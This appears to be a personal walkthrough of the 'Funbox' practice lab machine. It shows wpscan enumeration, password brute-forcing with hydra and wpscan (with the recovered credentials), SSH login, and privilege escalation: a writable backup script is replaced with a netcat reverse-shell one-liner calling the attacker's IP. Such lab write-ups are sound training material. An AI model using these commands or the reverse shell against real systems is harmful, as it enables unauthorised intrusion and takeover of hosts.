### Initial Foothold
Autorecon on 192.168.191.77

Realised its a wpscan site
```
wpscan --url http://funbox.fritz.box  --enumerate ap,u,t  --disable-tls-checks
[i] User(s) Identified:
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
[+] joe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

wpscan --url http://funbox.fritz.box  --plugins-detection aggressive  --disable-tls-checks
[i] Plugin(s) Identified:
[+] akismet
 | Location: http://funbox.fritz.box/wp-content/plugins/akismet/
 | Version: 4.1.6 (100% confidence)
[+] hello-dolly
 | Location: http://funbox.fritz.box/wp-content/plugins/hello-dolly/
 | Latest Version: 1.7.2 (up to date)
 | Version: 1.7.2 (80% confidence)
[+] https://github.com/placetopay/woocommerce-gateway-placetopay
 | Location: http://funbox.fritz.box/wp-content/plugins/https://github.com/placetopay/woocommerce-gateway-placetopay/
 | The version could not be determined.
```
Nothing much to exploit with the plugins as searched on exploit-db. Obtained 2 user admin and joe. Put them in `users.txt`.

From autorecon `/secrets/` seems interesting so decided to feroxbuster on it. Yielded nothing.

Try to get passwords to password spray everywhere. Nothing yielded
```
cewl http://funbox.fritz.box/ -d 4 -m 5 --with-numbers -w  cewl1.txt
hydra -L users.txt -P cewl1.txt 192.168.191.77 ftp -t 4 -V
wpscan --url http://funbox.fritz.box/wp-login.php --usernames users.txt --passwords cewl1.txt -t 100 --disable-tls-checks 
hydra -l joe -P cewl1.txt ssh://192.168.191.77 -t 4 -V
```
In cewl1.txt there are two base64 encoded.
```
VGhpcyBpcyBub3QgYSBDVEYtR2FtZS4gVGhpcyBpcyBhIHJlYWxsaWZlIGJveC4
This is not a CTF-Game. This is a reallife box.
WW91IHJlYWxseSBoYXZlIDIgdHJ5IGhhcmRlci4gVGhpcyBpc3Qgbm90IGEga2lkZHlib3gu
You really have 2 try harder. This ist not a kiddybox.
```

Give up on password list.
```
wpscan --url http://funbox.fritz.box/wp-login.php --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt -t 100 --disable-tls-checks 
[!] Valid Combinations Found:
 | Username: joe, Password: 12345
 | Username: admin, Password: iubire
```
surprisingly this joe password worked for ssh as well
```
penelope ssh joe@192.168.191.77 
```
Obtain initial access

### Privesc

mbox file in home.
```
cat mbox 
From root@funbox  Fri Jun 19 13:12:38 2020
Return-Path: <root@funbox>
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
        id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
Subject: Backups
To: <joe@funbox>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200619131238.2D257446B0@funbox.fritz.box>
Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
From: root <root@funbox>

Hi Joe, please tell funny the backupscript is done.
```
Apparently there is some script.

Transfer pspy64 to find out root and funny are both running backup.sh script

Change the .backup.sh file to the below code
```
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.216 1234 >/tmp/f
```

Launch Penelope to catch the shell
```
┌──(kali㉿kali)-[~/offsec/funbox]
└─$ penelope -p 1234                   
[+] Listening for reverse shells on 0.0.0.0:1234 -> 127.0.0.1 • 192.168.73.128 • 172.17.0.1 • 172.18.0.1 • 192.168.45.216
[+] [New Reverse Shell] => lab-pg-20-ubuntu20-funbox-240-141 192.168.191.77 Linux-x86_64 👤 funny(1000) 😍️ Session ID <1>
[+] [New Reverse Shell] => lab-pg-20-ubuntu20-funbox-240-141 192.168.191.77 Linux-x86_64 👤 root(0) 😍️ Session ID <2>
[+] [New Reverse Shell] => lab-pg-20-ubuntu20-funbox-240-141 192.168.191.77 Linux-x86_64 👤 funny(1000) 😍️ Session ID <3>
funny@lab-pg-20-ubuntu20-funbox-240-141:~$ 
PRESS F12
[!] Session detached ⇲
(Penelope)─(Session [1])> sessions
➤  lab-pg-20-ubuntu20-funbox-240-141 192.168.191.77 Linux-x86_64
    ID  | Shell | User        | Source                   
    [1] | PTY   | funny(1000) | TCPListener(0.0.0.0:1234)
    <2> | Raw   | root(0)     | TCPListener(0.0.0.0:1234)
    <3> | Raw   | funny(1000) | TCPListener(0.0.0.0:1234)
(Penelope)─(Session [1])> interact 2
root@lab-pg-20-ubuntu20-funbox-240-141:~# 
```
Press F12, and then `interact 2` in penelope to change session to root.


Dirtyfrag worked. Pwnkit worked. Copyfail worked.
